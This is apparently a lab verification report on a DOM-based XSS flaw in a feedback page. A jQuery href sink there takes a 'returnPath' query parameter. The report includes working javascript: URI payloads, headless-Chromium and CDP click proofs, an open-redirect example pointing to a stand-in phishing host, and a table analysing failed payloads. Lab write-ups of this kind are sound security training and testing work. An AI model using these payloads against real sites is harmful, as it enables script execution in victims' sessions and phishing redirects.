# Verification — DOM XSS in jQuery href(source: location.search)

## Methodology
1. Static review (curl): read the inline script on `/feedback`; identify source
   (`returnPath`), sink (`.attr("href", …)`), assignment shape (whole-attribute, no breakout).
2. SSR check: grep the response for a unique marker — must be absent (pure DOM sink).
3. Attribute proof (headless dump): `href` must equal the decoded attacker string.
4. Click-execution proof (local Chromium + CDP, programmatic click): side-effect
   assertion on `document.title` wrapped in `void(...)` so the page survives.
5. Mechanism proof for the secondary impact: arbitrary `https://` URL accepted as href.
6. Lab acceptance: real-browser tab + physical click on "Back"; banner check.

## Evidence

### 1. Sink code identified (curl, GET /feedback?returnPath=/)
```js
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
Whole-attribute assignment — no breakout characters applicable.

### 2. SSR check: zero server reflection (curl)
```
GET /feedback?returnPath=SRVMARK<>"'
→ 0 occurrences of SRVMARK in the response
```
Pure DOM sink — response inspection alone can never reveal it.

### 3. Attribute proof (headless Chromium --dump-dom)
```
GET /feedback?returnPath=javascript%3Aalert(1)
→ <a id="backLink" href="javascript:alert(1)">
```
Attacker string lands verbatim in the attribute (single `%3A`→`:` decode by
URLSearchParams; `()` need no encoding).

### 4. Click-execution proof (CDP-driven click, no dialog)
```
GET /feedback?returnPath=javascript%3Avoid(document.title%3D%27CLICKFIRED2%27)
Page.navigate → wait 6s (load + jQuery ready) → Runtime.evaluate(click #backLink)
→ href before click : javascript:void(document.title='CLICKFIRED2')
→ title before click: DOM XSS in jQuery anchor href attribute sink using location.search source
→ title after click : CLICKFIRED2
```
Clean proof: code ran in page origin on click, page intact.

### 5. `void()` vs bare-expression behavior (observed, worth knowing)
First run used `javascript:document.title='CLICKFIRED'` (no `void`): after click the
`<title>` came back EMPTY — the string result of the expression replaced the document
(a plaintext page `CLICKFIRED`). Execution proven but page destroyed. Rule for harnesses:
always wrap proof expressions in `void(...)`.

### 6. Open-redirect mechanism proof (headless dump)
```
GET /feedback?returnPath=https%3A%2F%2Fevil.example%2Fphish
→ <a id="backLink" href="https://evil.example/phish">
```
Same sink accepts arbitrary off-site targets — no validation of any kind.

### 7. Lab acceptance
Real browser tab opened at `/feedback?returnPath=javascript%3Aalert(1)`; physical click
on the "Back" link fired `alert(1)` → banner `is-solved` (4/4 consecutive polls).

### 8. Failed-candidate analysis
| Attempt | Result | Why |
|---|---|---|
| `<script>alert(1)</script>` as returnPath | inert string in href | `.attr()` never parses markup; payload shape must be a URI, not HTML |
| `<img src=x onerror=…>` as returnPath | inert string in href | same — no fragment parsing in an attribute assignment |
| `data:text/html,<script>…` | navigates away to new document | executes (if at all) in a NEW origin-less document, not the app origin — loses victim context; wrong primitive for this objective |
| Escaping with `\"` / HTML entities | n/a | no quoting/encoding layer exists between source and sink to escape from |
| curl-only "verification" | impossible | no JS execution and no click simulation; DOM+interaction sinks require a driver |

## Reproducibility
```
BASE=…
# attribute proof
chromium --headless --no-sandbox --dump-dom "$BASE/feedback?returnPath=javascript%3Aalert(1)" | grep -o '<a id="backLink"[^>]*>'
# SSR-absence proof
curl -s "$BASE/feedback?returnPath=SRVMARKxyz" | grep -c SRVMARK   # expect 0
# click proof: CDP (see /tmp/opencode/cdp_click.py pattern): navigate, Runtime.evaluate click, read title
```

## Confirmation criteria
- CONFIRMED: verbatim href control, click-driven code execution (title side-effect),
  arbitrary-URL acceptance, real-browser `alert(1)` + lab acceptance.
- Note the tooling gap honestly: no available MCP tool performs clicks in the user's
  browser — the final lab-acceptance click is a physical user action; everything up to
  it (including a programmatic click proof) was automated via local CDP.